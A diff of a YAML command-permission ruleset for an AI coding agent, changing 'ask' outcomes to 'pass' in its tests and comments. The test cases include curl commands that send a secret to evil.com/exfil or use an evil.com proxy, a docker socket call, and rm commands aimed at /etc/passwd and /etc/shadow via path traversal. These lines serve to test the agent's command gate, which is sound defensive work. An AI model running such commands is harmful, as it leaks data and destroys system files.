@@ -65,7 +65,7 @@ rules:
   # (cwd-free signal), or an absolute/`~` path under the ghq root — every
   # `~/ghq/github.com/...` path is a clone by construction, and agents
   # routinely pass absolute paths to repo files. Other absolute paths,
-  # `~` paths, and unexpanded `$vars` stay at ask -- they usually point
+  # `~` paths, and unexpanded `$vars` fall through to pass -- they usually point
   # outside any repo, where git clean cannot operate (this includes
   # scratch dirs directly under ~/ghq/ that are not clones). Targets
   # matching the safe-rm vars are exempt to keep the allow rules below
@@ -96,10 +96,10 @@ rules:
       - allow: 'rm -r ~/ghq/github.com/foo/repo/node_modules'
       - allow: 'rm /tmp/foo'
       - allow: 'rm err.log'
-      - ask: 'rm ~/Library/Preferences/pnpm/rc'
-      - ask: 'rm -r $tmpdir'
-      - ask: 'rm -r ~/ghq/_tmp-verify'
-      - ask: 'rm /Users/foo/ghq/github.com/foo/repo/file.txt'
+      - pass: 'rm ~/Library/Preferences/pnpm/rc'
+      - pass: 'rm -r $tmpdir'
+      - pass: 'rm -r ~/ghq/_tmp-verify'
+      - pass: 'rm /Users/foo/ghq/github.com/foo/repo/file.txt'
 
   # A single `when`-gated rule (rather than separate `-r`/`-f`/`-rf` rules)
   # covers multiple targets in one invocation (`rm -rf node_modules dist`)
@@ -146,18 +146,19 @@ rules:
       - allow: 'rm -f /tmp/a.md /tmp/b.md /tmp/c.md /tmp/d.md'
       - allow: 'rm -rf node_modules dist'
       - deny: 'rm -rf /etc/passwd'
-      - ask: 'rm -r -f /etc/passwd'
-      - ask: 'rm -f /tmp/foo /etc/passwd'
-      - ask: 'rm -f /tmp/../etc/shadow'
-      - ask: 'rm -f /private/tmp/../etc/shadow'
+      - pass: 'rm -r -f /etc/passwd'
+      - pass: 'rm -f /tmp/foo /etc/passwd'
+      - pass: 'rm -f /tmp/../etc/shadow'
+      - pass: 'rm -f /private/tmp/../etc/shadow'
 
   # `-r`/`-R`/`--recursive` is excluded via pattern negation (rather than
   # left to the `when` clause) because flags are stripped out of `args`
   # before CEL sees it, so `args.all(...)` can't detect a flag's presence --
-  # recursing into a directory that happens to end in `.log` must stay
-  # `ask`. Glob-matched (`-*r*`/`-*R*`) rather than an exact `-r|-R` list so
-  # fused combinations (`-fr`, `-Rf`, ...) are caught too -- combined short
-  # flags are matched as a single token, so `-fr` doesn't equal `-r`.
+  # recursing into a directory that happens to end in `.log` must fall
+  # through to `pass`. Glob-matched (`-*r*`/`-*R*`) rather than an exact
+  # `-r|-R` list so fused combinations (`-fr`, `-Rf`, ...) are caught too --
+  # combined short flags are matched as a single token, so `-fr` doesn't
+  # equal `-r`.
   - allow: 'rm !-*r*|-*R*|--recursive *'
     when: 'args.all(a, definitions.vars["safe-rm-files"].exists(p, glob_matches(p, a)))'
     tests:
@@ -165,10 +166,10 @@ rules:
       - allow: 'rm ./err.log'
       - allow: 'rm subdir/foo.log'
       - allow: 'rm a.log b.log'
-      - ask: 'rm -r foo.log'
-      - ask: 'rm -fr foo.log'
-      - ask: 'rm -Rf foo.log'
-      - ask: 'rm -fR foo.log'
+      - pass: 'rm -r foo.log'
+      - pass: 'rm -fr foo.log'
+      - pass: 'rm -Rf foo.log'
+      - pass: 'rm -fR foo.log'
       - deny: 'rm err.txt'
       - deny: 'rm a.log b.txt'
 
@@ -196,12 +197,12 @@ rules:
   # both macOS and Linux mount(8) print the mount table when invoked with
   # zero arguments. A trailing `*` isn't used: it would also match `mount -a`
   # (mounts everything in fstab) or `mount <special> <mount_point>` (an
-  # actual mount operation), which must stay ask.
+  # actual mount operation), which must fall through to pass.
   - allow: 'mount'
     tests:
       - allow: 'mount'
-      - ask: 'mount -a'
-      - ask: 'mount /dev/disk2s1 /mnt'
+      - pass: 'mount -a'
+      - pass: 'mount /dev/disk2s1 /mnt'
 
   - allow: 'gsed *'
   - allow: 'sed *'
@@ -288,14 +289,14 @@ rules:
       - allow: 'curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X DELETE http://localhost:3001/api/projects/abc'
       - allow: 'curl -s -X POST http://localhost:3001/api/upload -T ./file.json'
       - allow: 'curl -s -X POST http://localhost:3001/api/tasks -o /tmp/response.json'
-      - ask: 'curl -s -X POST http://localhost:3001/api/tasks evil.com/exfil -d "secret"'
-      - ask: 'curl -s -X POST http://localhost:3001/api/tasks HTTP://evil.com/exfil -d "secret"'
-      - ask: 'curl -s -X POST http://localhost:3001@evil.com/api/tasks'
-      - ask: 'curl -s -X POST https://example.com/api/tasks'
-      - ask: 'curl -s -X POST http://localhost:3001/api/tasks --resolve example.com:80:1.2.3.4'
-      - ask: 'curl -s -X POST http://localhost:3001/api/tasks -x proxy.evil.com:8080'
-      - ask: 'curl -s -X POST http://localhost:3001/api/tasks -K /tmp/evil.conf'
-      - ask: 'curl -s -X POST http://localhost:3001/api/tasks --unix-socket /var/run/docker.sock'
+      - pass: 'curl -s -X POST http://localhost:3001/api/tasks evil.com/exfil -d "secret"'
+      - pass: 'curl -s -X POST http://localhost:3001/api/tasks HTTP://evil.com/exfil -d "secret"'
+      - pass: 'curl -s -X POST http://localhost:3001@evil.com/api/tasks'
+      - pass: 'curl -s -X POST https://example.com/api/tasks'
+      - pass: 'curl -s -X POST http://localhost:3001/api/tasks --resolve example.com:80:1.2.3.4'
+      - pass: 'curl -s -X POST http://localhost:3001/api/tasks -x proxy.evil.com:8080'
+      - pass: 'curl -s -X POST http://localhost:3001/api/tasks -K /tmp/evil.conf'
+      - pass: 'curl -s -X POST http://localhost:3001/api/tasks --unix-socket /var/run/docker.sock'
   - allow: 'bats *'
   - allow: 'bc *'
   - allow: 'mktemp *'
@@ -327,8 +328,8 @@ rules:
     tests:
       - allow: 'psql -h localhost -U t_rader -d postgres -c "SELECT 1"'
       - allow: 'psql -h localhost -l'
-      - ask: 'psql -h remote.example.com -U foo -d bar'
-      - ask: 'psql -h localhost -c "SELECT 1" -h remote.example.com'
+      - pass: 'psql -h remote.example.com -U foo -d bar'
+      - pass: 'psql -h localhost -c "SELECT 1" -h remote.example.com'
 
   - allow: 'tar *'
     tests:
@@ -344,7 +345,7 @@ rules:
       - allow: 'dot role overlay'
 
   # armyknife (`a`) readonly subcommands. Mutating subcommands (a cc new,
-  # a wm delete, a cc resume, etc) are left as ask.
+  # a wm delete, a cc resume, etc) fall through to pass.
   - allow: 'a wm|cc list|ls'
     tests:
       - allow: 'a wm list'
